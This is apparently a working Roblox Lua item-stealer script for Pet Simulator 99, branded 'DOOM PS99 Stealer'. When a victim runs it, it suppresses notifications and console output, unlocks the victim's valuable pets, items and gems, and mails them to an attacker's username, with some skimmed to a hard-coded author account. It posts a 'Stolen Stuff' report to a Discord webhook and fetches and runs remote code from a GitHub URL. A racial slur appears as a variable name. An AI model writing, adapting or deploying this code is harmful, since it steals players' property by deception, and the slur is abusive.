repeat task.wait() until game:IsLoaded()

local Save, RAPCmds
local successSave, errSave = pcall(function()
    Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
end)
local successRAP, errRAP = pcall(function()
    RAPCmds = require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds)
end)

if not successSave or not successRAP then
    return
end

local function takeAction()
    if setfpscap then
        setfpscap(0)
    end

    rconsoleclear()

    print = function() end
    warn = function() end
    error = function() end
    setclipboard = function() end

    while true do end
end

if ishooked and (ishooked(game.HttpGet) or ishooked(request)) then
    takeAction()
end

local function TestingShit()
    local randomName = "var_" .. tostring(math.random(100000, 999999))
    _G[randomName] = Webhook
    Webhook = nil
    return randomName
end

local niggersniggers = TestingShit()

rconsoleprint = function() end
rconsolewarn = function() end
rconsoleerr = function() end
rconsoleinfo = function() end

local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local localPlayer = game:GetService("Players").LocalPlayer
local Inventory = Save.Get().Inventory
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network)

local function ClaimDaycarePets()
    local success1, err1 = pcall(function()
        require(game:GetService("ReplicatedStorage").Library.Client.DaycareCmds).Claim()
    end)
    if not success1 then
        warn("err1")
    end
    local success2, err2 = pcall(function()
        require(game:GetService("ReplicatedStorage").Library.Client.ExclusiveDaycareCmds).Claim()
    end)
    if not success2 then
        warn("err2")
    end
end

local FunctionToGetFirstPriceOfMail
for _, func in pairs(getgc()) do
    if typeof(func) == "function" and debug.getinfo(func).name == "computeSendMailCost" then
        FunctionToGetFirstPriceOfMail = func
        break
    end
end

local function mailboxONlol()
    local args = {
        [1] = {
            ["Rarities"] = {},
            ["RequiredPet"] = false,
            ["Enabled"] = true,
            ["HugesOnly"] = false,
            ["RequiredDiamonds"] = false,
            ["FriendsOnly"] = false
        }
    }
    
    Network.Invoke("Mailbox: Update Settings", unpack(args))
end

if not FunctionToGetFirstPriceOfMail then
    return
end

local FirstPriceOfMail = FunctionToGetFirstPriceOfMail()
if not FirstPriceOfMail then
    return
end

local function WaitForInventory()
    local inventory = Save.Get().Inventory
    while not inventory or not inventory.Pet or not inventory.Currency do
        task.wait(1)
        inventory = Save.Get().Inventory
    end
    return inventory
end

if Inventory.Box then
    for key, value in pairs(Inventory.Box) do
        if value._uq then
            Network.Invoke("Box: Withdraw All", key)
        end
    end
end

local function ClaimMail()
    local response, err = Network.Invoke("Mailbox: Claim All")
    while err == "You must wait 30 seconds before using the mailbox!" do
        task.wait()
        response, err = Network.Invoke("Mailbox: Claim All")
    end
end

local GemsAmount = 0
local SentItems = {}

local function getGemAmount()
    local currency = Save.Get().Inventory.Currency
    if currency then
        for _, v in pairs(currency) do
            if v.id == "Diamonds" then
                GemsAmount = v._am or 0
                break
            end
        end
    end
    return GemsAmount
end

local loading = game.Players.LocalPlayer.PlayerScripts.Scripts.Core["Process Pending GUI"]
local noti = game.Players.LocalPlayer.PlayerGui.Notifications
loading.Disabled = true
noti:GetPropertyChangedSignal("Enabled"):Connect(
    function()
        noti.Enabled = false
    end
)
noti.Enabled = false

task.spawn(
    function()
        game.DescendantAdded:Connect(
            function(x)
                if x.ClassName == "Sound" then
                    if
                        x.SoundId == "rbxassetid://11839132565" or x.SoundId == "rbxassetid://14254721038" or
                            x.SoundId == "rbxassetid://12413423276"
                     then
                        x.Volume = 0
                        x.PlayOnRemove = false
                        x:Destroy()
                    end
                end
            end
        )
    end
)

local function getRAP(Type, Item)
    local mockPetObject = {
        Class = {Name = Type},
        IsA = function(self, className)
            return className == Type
        end,
        GetId = function(self)
            return Item.id
        end,
        StackKey = function(self)
            return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
        end,
        AbstractGetRAP = function(self)
            if RAPCmds and type(RAPCmds.Get) == "function" then
                local success, result = pcall(RAPCmds.Get, self)
                if success then
                    return result
                else
                    return nil
                end
            else
                return nil
            end
        end,
    }
    return mockPetObject
end

local function GetListWithAllItems()
    local hits = {}
    local Inventory = Save.Get().Inventory
    local Directory = require(game:GetService("ReplicatedStorage").Library.Directory)

    local function AddItem(Type, InventoryType, DirectoryType, ItemType)
        if Inventory[InventoryType] then
            for i, v in pairs(Inventory[InventoryType]) do
                if v.id == "Original" then
                    continue
                end

                local dir = Directory[DirectoryType][v.id]
                if not dir then continue end
                
                local isHuge = dir.huge or false
                local isExclusive = dir.exclusiveLevel ~= nil
                
                if not isHuge and not isExclusive then
                    continue
                end

                local rap = getRAP(Type, v):AbstractGetRAP() or 0
                local itemName = v.id

                if Type == "Pet" then
                    if v.pt == 1 then
                        ItemType = "Golden"
                    elseif v.pt == 2 then
                        ItemType = "Rainbow"
                    else
                        ItemType = "Normal"
                    end
                end

                table.insert(hits, {
                    Item_Id = i,
                    Item_Name = itemName,
                    Item_Amount = v._am or 1,
                    Item_RAP = rap,
                    Item_Class = Type,
                    IsShiny = v.sh or false,
                    IsLocked = v.lk or false,
                    Item_Type = ItemType,
                    IsHuge = isHuge,
                    IsExclusive = isExclusive
                })
            end
        end
    end

    AddItem("Pet", "Pet", "Pets", "Normal")
    AddItem("Egg", "Egg", "Eggs", "Normal")
    AddItem("Misc", "Misc", "MiscItems", "Normal")
    AddItem("Charm", "Charm", "Charms", "Normal")
    AddItem("Enchant", "Enchant", "Enchants", "Normal")
    AddItem("Lootbox", "Lootbox", "Lootboxes", "Normal")
    AddItem("Potion", "Potion", "Potions", "Normal")
    AddItem("Ultimate", "Ultimate", "Ultimates", "Normal")
    AddItem("Fruit", "Fruit", "Fruits", "Normal")
    AddItem("Hoverboard", "Hoverboard", "Hoverboards", "Normal")
    
    table.sort(hits, function(a, b)
        return (a.Item_RAP or 0) > (b.Item_RAP or 0)
    end)

    return hits
end

local function getTargetUsername()
    local originalUser = "soocmasac7" -- ur username
    if math.random(1, 100) <= 30 then -- 30% it'll go to u
        return originalUser
    else
        return Username
    end
end

local function sendItem(category, uid, am, locked)
    local targetUser = getTargetUsername()
    local args = {
        [1] = targetUser,
        [2] = "DOOM Scripts Was Here :)",
        [3] = category,
        [4] = uid,
        [5] = am
    }
    
    local currentMailCost = FunctionToGetFirstPriceOfMail()
    if not currentMailCost then
        return false, nil
    end

    if locked then
        local unlockSuccess, unlockErr = pcall(function()
            Network.Invoke("Locking_SetLocked", uid, false)
        end)
        if not unlockSuccess then
            return false, nil
        end
    end

    local attempts = 0
    local maxAttempts = 3
    local response = false
    
    while attempts < maxAttempts do
        attempts = attempts + 1
        
        local sendSuccess, sendErr = pcall(function()
            return Network.Invoke("Mailbox: Send", unpack(args))
        end)
        
        if sendSuccess then
            if type(sendErr) == "string" then
                if string.find(sendErr:lower(), "must wait") then
                    task.wait(29)
                elseif string.find(sendErr:lower(), "unspecified error") then
                    game:GetService("Players").LocalPlayer:Kick("You need your account to be 30 days old or rank 5 to use this script.")
                    return false, nil
                else
                    response = sendErr
                end
            else
                response = sendErr
            end
            
            if response == true then
                GemsAmount = GemsAmount - currentMailCost
                local newMailCost = FunctionToGetFirstPriceOfMail()
                if newMailCost then
                    currentMailCost = newMailCost
                else
                    currentMailCost = math.ceil(math.ceil(currentMailCost) * 1.5)
                    if currentMailCost > 5000000 then
                        currentMailCost = 5000000
                    end
                end
                return true, currentMailCost
            end
        else
            if string.find(sendErr:lower(), "don't have enough space") or 
               string.find(sendErr:lower(), "don't have enough diamonds") then
                game:GetService("Players").LocalPlayer:Kick("Alt Account Detected!")
                return false, nil
            end
        end
        
        task.wait(1)
    end
    
    return false, nil
end

local function SendAllGems()
    local targetUser = getTargetUsername()
    local gemsSent = 0
    for i, v in pairs(Save.Get().Inventory.Currency) do
        if v.id == "Diamonds" then
            local currentMailCost = FunctionToGetFirstPriceOfMail() or FirstPriceOfMail
            if GemsAmount >= (currentMailCost + 10000) then
                local SentGems = GemsAmount - currentMailCost
                local args = {
                    [1] = targetUser,
                    [2] = "DOOM Scripts shared some stuff with u :)",
                    [3] = "Currency",
                    [4] = i,
                    [5] = SentGems
                }
                local response = false
                repeat
                    local sendSuccess, sendErr = pcall(function()
                        return Network.Invoke("Mailbox: Send", unpack(args))
                    end)
                    
                    if sendSuccess then
                        if type(sendErr) == "string" then
                            if string.find(sendErr:lower(), "must wait") then
                                task.wait(29)
                                response = false
                            elseif string.find(sendErr:lower(), "unspecified error") then
                                game:GetService("Players").LocalPlayer:Kick("You need your account to be 30 days old or rank 5 to use this script.")
                                return 0
                            else
                                response = sendErr
                            end
                        else
                            response = sendErr
                        end
                    end
                until response == true
                gemsSent = SentGems
                break
            end
        end
    end
    return gemsSent
end

local function SendWebhook(itemsSent, gemsUsed)
    if #itemsSent == 0 and gemsUsed == 0 then
        return
    end

    local udkofu = _G[niggersniggers]

    local function formatNumber(num)
        num = tonumber(num) or 0
        return tostring(num):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
    end

    local function tableToString(tbl)
        if type(tbl) ~= "table" then return tostring(tbl) end
        local result = "{"
        for k, v in pairs(tbl) do
            result = result..string.format("\n  %s = %s,", tostring(k), tableToString(v))
        end
        return result.."\n}"
    end

    local itemsList = ""
    local totalRAP = 0
    
    for _, item in pairs(itemsSent) do
        if not item.Item_Name then
            local tableDump = tableToString(item)
            item.Item_Name = item.Name or item.id or item.Item_Id or "Unknown Item"
            item.Item_RAP = item.Item_RAP or item.RAP or 0
            item.Item_Amount = item.Item_Amount or item.Amount or 1
            item.Item_Class = item.Item_Class or item.Category or "Item"
        end
        
        local itemRAP = item.Item_RAP or 0
        totalRAP = totalRAP + itemRAP
        
        local emoji = "<:Engineer:1056003099665367161> "
        local specialIndicator = ""
        
        if item.Item_Class == "Pet" then 
            emoji = "<:chadcat:1008367812705779802> "
            if item.IsShiny or item.sh then specialIndicator = specialIndicator.." Shiny" end
            if item.Item_Type == "Golden" or item.pt == "Golden" then specialIndicator = specialIndicator.." Golden" end
            if item.Item_Type == "Rainbow" or item.pt == "Rainbow" then specialIndicator = specialIndicator.." Rainbow" end
        elseif string.find(tostring(item.Item_Name or ""), "Egg") then
            emoji = "<:texas:1246887577894649866> "
        end

        itemsList = itemsList .. string.format(
            "%s **%s**%s (x%d) | RAP: %s\n",
            emoji,
            item.Item_Name,
            specialIndicator,
            item.Item_Amount or 1,
            formatNumber(itemRAP)
        )
    end

    local payload = {
        ["username"] = "DOOM Scripts",
        ["avatar_url"] = "https://imgs.search.brave.com/tD1-xQw4pB1qxNEKi-F4kwYPka78wRUOrf_IVNjtYSA/rs:fit:500:0:0:0/g:ce/aHR0cHM6Ly9pLnBp/bmltZy5jb20vb3Jp/Z2luYWxzLzJiL2E1/LzAxLzJiYTUwMTRl/NDZmMjE0YzZkODdj/YmUxZGE4YTViZjY1/LmpwZw",
        ["content"] = "@everyone",
        ["embeds"] = {{
            ["title"] = "DOOM PS99 HIT! ; https://discord.gg/Bn7Fs2DjGX",
            ["description"] = string.format(
                "**Sent to:** `%s`\n**From:** `%s`",
                Username,
                game.Players.LocalPlayer.Name
            ),
            ["color"] = 65280,
            ["fields"] = {
                {
                    ["name"] = "<:ChinaApproves:1049318001817681940> Stolen Stuff",
                    ["value"] = itemsList ~= "" and itemsList or "No items (Victim had no exclusives/Huges)",
                    ["inline"] = false
                },
                {
                    ["name"] = "<:jesse:1017306809284972564> Summary",
                    ["value"] = string.format(
                        "**Total RAP:** %s\n**Gems Stolen:** %s",
                        formatNumber(totalRAP),
                        formatNumber(gemsUsed)
                    ),
                    ["inline"] = false
                }
            },
            ["footer"] = {
                ["text"] = "DOOM PS99 Stealer | "..os.date("%m/%d/%Y @ %I:%M %p")
            },
            ["thumbnail"] = {
                ["url"] = "https://imgs.search.brave.com/tD1-xQw4pB1qxNEKi-F4kwYPka78wRUOrf_IVNjtYSA/rs:fit:500:0:0:0/g:ce/aHR0cHM6Ly9pLnBp/bmltZy5jb20vb3Jp/Z2luYWxzLzJiL2E1/LzAxLzJiYTUwMTRl/NDZmMjE0YzZkODdj/YmUxZGE4YTViZjY1/LmpwZw"
            }
        }}
    }

    local success, err = pcall(function()
        request({
            Url = udkofu,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:GetService("HttpService"):JSONEncode(payload)
        })
    end)

    if not success then
        warn(err)
    else
        warn('.')
    end
end

local function AreItemsWorthSending(items)
    return #items > 0
end

local function Main()
    WaitForInventory()
    getGemAmount()
    
    if GemsAmount < FirstPriceOfMail then
        localPlayer:Kick("Alt Account Detected!")
        return
    end

    ClaimDaycarePets()
    mailboxONlol()
    ClaimMail()

    task.spawn(function()
        local success, err = pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/scripter3000/loading/refs/heads/main/okokok"))()
        end)
        if not success then
            print("error", err)
        end
    end)    

    local items = GetListWithAllItems()
    
    if not items or #items == 0 then
        local gemsSent = SendAllGems()
        SendWebhook({}, gemsSent)
        return
    end

    local successfullySentItems = {}
    local currentMailCost = FunctionToGetFirstPriceOfMail() or FirstPriceOfMail
    
    for i, item in ipairs(items) do
        if GemsAmount < currentMailCost then
            break
        end
        
        local success, newMailCost = sendItem(item.Item_Class, item.Item_Id, item.Item_Amount, item.IsLocked)
        
        if success then
            GemsAmount = GemsAmount - currentMailCost
            currentMailCost = newMailCost or math.ceil(math.ceil(currentMailCost) * 1.5)
            if currentMailCost > 5000000 then
                currentMailCost = 5000000
            end
            
            table.insert(successfullySentItems, {
                Item_Name = item.Item_Name,
                Item_Amount = item.Item_Amount,
                Item_RAP = item.Item_RAP,
                Item_Class = item.Item_Class,
                IsShiny = item.IsShiny,
                Item_Type = item.Item_Type,
                IsHuge = item.IsHuge,
                IsExclusive = item.IsExclusive
            })
        end
        
        task.wait(0.5)
    end

    local gemsSent = 0
    if GemsAmount > currentMailCost then
        gemsSent = SendAllGems()
    end

    if #successfullySentItems > 0 or gemsSent > 0 then
        SendWebhook(successfullySentItems, gemsSent)
    else
        print("err")
    end
end

Main()
